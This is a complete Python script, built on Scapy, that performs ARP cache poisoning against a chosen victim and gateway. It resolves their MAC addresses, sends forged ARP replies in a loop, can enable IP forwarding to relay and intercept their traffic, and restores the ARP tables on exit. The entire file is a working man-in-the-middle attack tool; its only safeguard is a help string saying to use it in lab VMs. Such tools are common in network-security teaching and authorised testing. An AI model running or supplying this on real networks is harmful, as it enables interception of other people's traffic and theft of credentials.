#!/usr/bin/env python3
# Simple ARP spoof tool using Scapy
# Usage example:
#   sudo python3 arp_spoof.py -i eth0 -v 10.0.0.5 -g 10.0.0.1 --enable-ipfwd -t 2 -V

import argparse    # parse CLI args
import sys         # exit
import time        # sleep
import threading   # run poison loop in background
import signal      # catch Ctrl+C
import os          # check uid, file writes

from scapy.all import ARP, Ether, srp, send, conf  # scapy primitives

conf.verb = 0  # disable scapy internal verbose prints; script prints intentionally

def is_root():
    # return True if running as root (required for raw packets and /proc writes)
    return os.geteuid() == 0

def get_mac(ip, iface, timeout=3, retry=2):
    """
    Resolve MAC address for an IP by sending an ARP request.
    Returns MAC string or None if unresolved.
    """
    # Build Ethernet broadcast + ARP request addressed to pdst
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    for _ in range(retry):
        # srp sends at layer 2 and returns answered packets
        ans, _ = srp(pkt, iface=iface, timeout=timeout, retry=0)
        if ans:
            # ans[0][1] is the reply packet; hwsrc is the responder's MAC
            return ans[0][1].hwsrc
    # unresolved
    return None

def set_ip_forward(enable):
    """
    Toggle IPv4 forwarding on Linux by writing to /proc/sys/net/ipv4/ip_forward.
    Returns previous value as string ("0" or "1"), or None on failure.
    """
    path = "/proc/sys/net/ipv4/ip_forward"
    try:
        with open(path, "r") as f:
            prev = f.read().strip()  # read current value
        # write desired value: "1" to enable, "0" to disable
        with open(path, "w") as f:
            f.write("1\n" if enable else "0\n")
        return prev
    except Exception as e:
        # write/read may fail if not Linux or permission issue
        print(f"[!] Failed to change ip_forward: {e}")
        return None

def poison(victim_ip, victim_mac, gateway_ip, gateway_mac, iface, interval, stop_event, verbose=False):
    """
    Continuously send forged ARP replies to victim and gateway to poison their ARP caches.
    Each reply claims the OTHER's IP maps to the ATTACKER's MAC.
    """
    # op=2 indicates an ARP reply ("is-at")
    # psrc = the IP we claim to own; hwsrc (not set) defaults to attacker's iface MAC
    pkt_to_victim = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
    pkt_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
    if verbose:
        # show intent: victim will think gateway IP is at attacker's MAC
        print(f"[+] Starting ARP poison: victim {victim_ip} ({victim_mac}) <- fake {gateway_ip}")
        print(f"[+] Starting ARP poison: gateway {gateway_ip} ({gateway_mac}) <- fake {victim_ip}")
    # send in a loop until stop_event is set (SIGINT)
    while not stop_event.is_set():
        send(pkt_to_victim, iface=iface, verbose=0)   # send forged reply to victim
        send(pkt_to_gateway, iface=iface, verbose=0)  # send forged reply to gateway
        if verbose:
            print(f"[>] Sent poison packets (victim <- {gateway_ip}, gateway <- {victim_ip})")
        time.sleep(interval)  # wait before repeating

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface, count=5, verbose=False):
    """
    Try to restore correct ARP mappings by broadcasting truthful ARP replies.
    This sends real IP->MAC mappings so targets update their caches.
    """
    if verbose:
        print("[+] Restoring ARP tables...")
    # Build ARP reply packets with the correct hwsrc values (gateway_mac, victim_mac)
    # hwdst set to broadcast so many hosts accept the update
    pkt_v = ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac)
    pkt_g = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=victim_ip, hwsrc=victim_mac)
    for _ in range(count):
        send(pkt_v, iface=iface, verbose=0)
        send(pkt_g, iface=iface, verbose=0)
        time.sleep(0.5)
    if verbose:
        print("[+] ARP tables should be restored (broadcasts sent).")

def parse_args():
    # parse command line arguments and return namespace
    p = argparse.ArgumentParser(description="ARP spoofing tool (scapy). Use only in lab VMs you control.")
    p.add_argument("-v", "--victim", required=True, help="Victim IP address")
    p.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    p.add_argument("-i", "--interface", required=True, help="Interface to use (e.g., eth0)")
    p.add_argument("--enable-ipfwd", action="store_true", help="Enable IP forwarding on attacker while spoofing")
    p.add_argument("--disable-ipfwd", action="store_true", help="Disable IP forwarding on attacker (explicit)")
    p.add_argument("-t", "--interval", type=float, default=2.0, help="Poison interval in seconds (default 2.0)")
    p.add_argument("-V", "--verbose", action="store_true", help="Verbose output")
    return p.parse_args()

def main():
    # ensure root privileges
    if not is_root():
        print("[!] This script must be run as root (sudo).")
        sys.exit(1)

    args = parse_args()

    # do not allow contradictory ipfwd flags
    if args.enable_ipfwd and args.disable_ipfwd:
        print("[!] Choose either --enable-ipfwd or --disable-ipfwd, not both.")
        sys.exit(1)

    # assign variables from args
    victim_ip = args.victim
    gateway_ip = args.gateway
    iface = args.interface
    interval = max(0.1, args.interval)  # avoid too-small intervals
    verbose = args.verbose

    print("[*] Resolving MAC addresses...")
    # resolve MACs for both targets before starting attack
    victim_mac = get_mac(victim_ip, iface)
    if not victim_mac:
        print(f"[!] Failed to resolve victim MAC for {victim_ip}. Aborting.")
        sys.exit(1)
    gateway_mac = get_mac(gateway_ip, iface)
    if not gateway_mac:
        print(f"[!] Failed to resolve gateway MAC for {gateway_ip}. Aborting.")
        sys.exit(1)

    if verbose:
        print(f"[+] Victim {victim_ip} is at {victim_mac}")
        print(f"[+] Gateway {gateway_ip} is at {gateway_mac}")

    # optionally enable/disable IP forwarding and remember previous value to restore later
    prev_ipfwd = None
    if args.enable_ipfwd:
        prev_ipfwd = set_ip_forward(True)
        if verbose:
            print(f"[+] IP forwarding enabled (previous={prev_ipfwd})")
    elif args.disable_ipfwd:
        prev_ipfwd = set_ip_forward(False)
        if verbose:
            print(f"[+] IP forwarding disabled (previous={prev_ipfwd})")

    # event used to stop the poison loop from another thread / signal handler
    stop_event = threading.Event()

    def signal_handler(sig, frame):
        # called on Ctrl+C or kill signal to stop poisoning and clean up
        if verbose:
            print(f"\n[!] Caught signal {sig}. Stopping attack and restoring state...")
        stop_event.set()
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # start poison in background so main thread can wait and catch signals
    poison_thread = threading.Thread(
        target=poison,
        args=(victim_ip, victim_mac, gateway_ip, gateway_mac, iface, interval, stop_event, verbose),
        daemon=True
    )
    poison_thread.start()

    try:
        # idle loop until stop_event is set (Ctrl+C)
        while not stop_event.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        # also handle KeyboardInterrupt just in case
        stop_event.set()

    # wait briefly for thread to stop
    poison_thread.join(timeout=2)

    # restore proper ARP state on targets
    restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface, count=5, verbose=verbose)

    # restore original ip_forward value if we changed it earlier
    if prev_ipfwd is not None:
        restored = set_ip_forward(prev_ipfwd == "1")
        if verbose:
            print(f"[+] Restored ip_forward to {prev_ipfwd} (current write attempt returned {restored})")

    print("[*] Done. Exiting.")

if __name__ == "__main__":
    main()